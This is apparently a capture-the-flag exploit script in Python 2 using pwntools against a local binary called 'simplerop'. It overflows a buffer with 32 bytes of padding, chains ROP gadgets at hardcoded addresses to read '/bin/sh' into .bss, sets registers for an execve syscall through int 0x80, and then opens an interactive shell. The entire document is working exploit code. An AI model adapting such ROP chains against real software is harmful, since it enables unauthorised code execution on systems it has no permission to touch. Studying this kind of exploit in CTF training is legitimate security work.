from pwn import *
context.log_level = "debug"
fpath = "./simplerop"
offset = 32
print shellcraft.sh()
p = process(fpath)
elf = ELF(fpath)
bss = elf.symbols["__bss_start"]
print hex(bss)
read_addr =  0x806CD50
write_addr = 0x806CDC0
p3p_r    = 0x0809de85
p_eax_r =  0x080bae06
p_ebx_r = 0x080481c9
p_d_c_b_r = 0x0806e850
p_edx_r = 0x0806e82a 
int_0x80 = 0x080493e1

p.recv()
# execve("/bin/sh\x00" , Null , Null)
# eax , 0xb
# ebx , bss
# ecx , 0
# edx , 0 
payload = offset * "a" + p32(read_addr) + p32(p3p_r) + p32(0) + p32(bss) + p32(10)
payload +=  p32(p_eax_r) + p32(0xb)  + p32(p_d_c_b_r) + p32(0) + p32(0) + p32(bss)
payload +=  p32(int_0x80)
p.sendline(payload)
p.send("/bin/sh\x00\x00")
p.interactive()
